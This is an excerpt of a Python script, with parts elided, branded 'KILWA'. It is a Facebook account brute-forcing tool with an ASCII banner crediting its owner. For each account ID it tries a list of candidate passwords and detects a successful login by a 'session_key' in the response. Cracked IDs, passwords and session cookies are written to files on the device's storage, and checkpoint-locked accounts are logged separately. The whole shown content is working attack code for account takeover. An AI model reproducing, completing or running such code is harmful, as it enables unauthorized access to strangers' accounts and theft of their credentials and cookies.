...
logo =f"""{A}
    {G1}    ____  __..___ .____    __      __   _____    
|    |/ _||   ||    |  /  \    /  \ /  _  \   
|      <  |   ||    |  \   \/\/   //  /_\  \  
|    |  \ |   ||    |___\        //    |    \ 
|____|__ \|___||_______ \\__/\  / \____|__  / 
        \/             \/     \/          \/  
                                              ───────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} X.A. Moha
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} AMIR\_____:*\❷/3:)\⓿
        ...
        try:
            ...
            for pw in psw:
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r\r{G1}[KILWA-OK] {sid} | {ps} ")
                    open('/sdcard/KILWA-M1-FILE-OK.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    oks.append(sid)
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r\r{M}[KILWA-CP] {sid} | {ps} ")
                     open('/sdcard/KILWA-M2-FILE-OK.txt','a').write(sid+'|'+ps+'\n')
                     cps.append(sid)
                else:
                    continue
            loop+=1
...
#__________________[ FILE METHOD M2 ]__________________#             
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r{G1}[{A}KILWA-M2{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(oks)}{G1}/{A}{len(cps)}{G1}] ")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
